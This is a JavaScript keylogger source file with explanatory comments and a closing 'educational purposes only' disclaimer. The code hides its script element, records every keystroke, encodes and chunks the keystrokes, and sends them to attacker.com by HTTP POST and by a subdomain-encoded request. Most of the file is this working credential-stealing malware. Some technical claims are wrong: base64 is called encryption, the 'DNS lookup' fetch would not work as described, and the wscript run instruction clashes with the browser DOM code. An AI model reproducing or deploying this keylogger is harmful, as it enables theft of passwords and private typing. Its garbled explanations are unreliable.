// Created July 6, 2023 - By: Devon Griffith A.K.A. rootPHAGE / 我爱数据
// Run on Windows with [ wscript <path to file>\JavaScript_Keylogger_Example.js ]

var f5b6h8 = [];

// Hide the script element so that it cannot be seen that it is running
var script = document.currentScript;
script.style.display = "none";

document.onkeydown = function(e) {
    f5b6h8.push(String.fromCharCode(e.keyCode)); // Takes the pressed key and adds it to the array

    if (f5b6h8.length > 50) { // Keeps the array size to a maximum of 50 keystrokes, any longer and the exported size is more noticeable
        var compressedData = compress(encrypt(f5b6h8)); // Compresses the array of keystrokes to make it easier to hide when exporting (function defined later)
        var splitData = splitIntoChunks(compressedData, 10); // "Chunks" the data by splitting into groups of 10 keystrokes (function defined later)
        f5b6h8 = []; // Resets the array to NULL-size so that it can start collecting more keystrokes
        
        // Send each chunk via HTTP (with TLS/SSL) and DNS
        splitData.forEach(function(chunk) {
            exfiltrateDataViaHTTP(chunk); // Calls the later used function to send the data to the attacker's server via XMLHttpRequest (XHR) object.
                                          // This script sends data via a POST request, which is harder to detect than the GET request
            exfiltrateDataViaDNS(chunk); // Calls the later-used function to send the data to the attacker's server via a DNS lookup.
                                         // Even though the "fetch" request will fail (since there aren't any valid resources to "fetch")
                                         // The DNS request itself will still be made and logged by the attacker's DNS server
        });
    }
};

function encrypt(data) {
    return window.btoa(data.join('')); // Encrypts the array of keystrokes so that they should remain "secret" about what they hold in case intercepted
}

function compress(encodedData) {
    // Use a simple run-length encoding process as the chosen example
    return encodedData.replace(/(.)\1*/g, function(match, p1) { return p1 + match.length; }); // Returns the arrays compressed so they are easier to hide
}

function splitIntoChunks(data, chunkSize) { // Function to "Chunk" the data as mentioned earlier
    var chunks = []; // Empty array to hold the 10 keystrokes per "Chunk"
    while (data.length) {
        chunks.push(data.slice(0, chunkSize));
        data = data.slice(chunkSize); // Split the data into groups of 10 keystrokes
    }
    return chunks;
}

function exfiltrateDataViaHTTP(chunk) { // Function to send the data via XMLHttpRequest (XHR) object
    var xhr = new XMLHttpRequest(); // Create a variable to hold the POST request for exfiltration of encrypted keystrokes
    xhr.open("POST", 'https://attacker.com/collect.php', true);
    xhr.setRequestHeader("Content-Type", "application/octet-stream"); // Set the "Request" type to POST
    xhr.send(chunk); // Exfiltrate the encrypted "Chunk" of keystrokes to the chosen server via POST request (XMLHttpRequest object)
}

function exfiltrateDataViaDNS(chunk) { // // Function to send the data via DNS lookup to the 
    var encodedSubdomain = chunk + ".attacker.com"; // Hold the encrypted "Chunk" in a variable
    fetch(encodedSubdomain, { mode: 'no-cors' }) // Send a DNS lookup to the chosen attacker's DNS server
    .catch(() => {});
}

// DO NOT USE THIS SCRIPT MALICIOUSLY - PROVIDED FOR EDUCATIONAL PURPOSES ONLY
